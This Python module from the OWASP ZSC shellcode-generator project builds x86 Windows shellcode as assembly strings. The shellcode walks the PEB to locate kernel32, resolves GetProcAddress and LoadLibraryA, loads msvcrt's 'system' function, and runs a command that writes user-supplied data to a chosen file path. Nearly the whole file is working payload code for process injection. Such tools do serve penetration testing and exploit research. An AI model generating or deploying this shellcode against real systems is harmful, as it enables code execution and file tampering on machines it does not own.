
"""
OWASP ZSC
https://www.owasp.org/index.php/OWASP_ZSC_Tool_Project
https://github.com/zscproject/OWASP-ZSC
http://api.z3r0d4y.com/
https://groups.google.com/d/forum/owasp-zsc [ owasp_zsc[at]googlegroups[dot]com ]
"""
from owasp_zsc.new_cores import stack
from owasp_zsc.new_cores import base_module


class Module(base_module.BaseModule):
    file_dest = base_module.OptString("", "File Destination")
    data = base_module.OptString("", "File data")

    def generate(self, command):
        payload = "xor    %ecx,%ecx"
        payload += "mov    %fs:0x30(%ecx),%eax"
        payload += "mov    0xc(%eax),%eax"
        payload += "mov    0x14(%eax),%esi"
        payload += "lods   %ds:(%esi),%eax"
        payload += "xchg   %eax,%esi"
        payload += "lods   %ds:(%esi),%eax"
        payload += "mov    0x10(%eax),%ebx"
        payload += "mov    0x3c(%ebx),%edx"
        payload += "add    %ebx,%edx"
        payload += "mov    0x78(%edx),%edx"
        payload += "add    %ebx,%edx"
        payload += "mov    0x20(%edx),%esi"
        payload += "add    %ebx,%esi"
        payload += "xor    %ecx,%ecx"
        payload += "inc    %ecx"
        payload += "lods   %ds:(%esi),%eax"
        payload += "add    %ebx,%eax"
        payload += "cmpl   $0x50746547,(%eax)"
        payload += "jne    23 <.text+0x23>"
        payload += "cmpl   $0x41636f72,0x4(%eax)"
        payload += "jne    23 <.text+0x23>"
        payload += "cmpl   $0x65726464,0x8(%eax)"
        payload += "jne    23 <.text+0x23>"
        payload += "mov    0x24(%edx),%esi"
        payload += "add    %ebx,%esi"
        payload += "mov    (%esi,%ecx,2),%cx"
        payload += "dec    %ecx"
        payload += "mov    0x1c(%edx),%esi"
        payload += "add    %ebx,%esi"
        payload += "mov    (%esi,%ecx,4),%edx"
        payload += "add    %ebx,%edx"
        payload += "xor    %esi,%esi"
        payload += "mov    %edx,%esi"
        payload += "xor    %ecx,%ecx"
        payload += "push   %ecx"
        payload += "push   $0x41797261"
        payload += "push   $0x7262694c"
        payload += "push   $0x64616f4c"
        payload += "push   %esp"
        payload += "push   %ebx"
        payload += "call   *%edx"
        payload += "xor    %ecx,%ecx"
        payload += "mov    $0x6c6c,%cx"
        payload += "push   %ecx"
        payload += "push   $0x642e7472"
        payload += "push   $0x6376736d"
        payload += "push   %esp"
        payload += "call   *%eax"
        payload += "xor    %edi,%edi"
        payload += "mov    %eax,%edi"
        payload += "xor    %edx,%edx"
        payload += "push   %edx"
        payload += "mov    $0x6d65,%dx"
        payload += "push   %edx"
        payload += "push   $0x74737973"
        payload += "mov    %esp,%ecx"
        payload += "push   %ecx"
        payload += "push   %edi"
        payload += "xor    %edx,%edx"
        payload += "mov    %esi,%edx"
        payload += "call   *%edx"
        payload += "xor    %ecx,%ecx"
        payload += command
        payload += "push   %esp"
        payload += "call   *%eax"
        payload += "xor    %edx,%edx"
        payload += "push   %edx"
        payload += "push   $0x74697865"
        payload += "mov    %esp,%ecx"
        payload += "push   %ecx"
        payload += "push   %edi"
        payload += "call   *%esi"
        payload += "xor    %ecx,%ecx"
        payload += "push   %ecx"
        payload += "call   *%eax"
        return payload

    def run(self):
        command = stack.generate(f"echo {self.data} > {self.file_dest}", "%ecx", "string")
        print(self.generate(command))
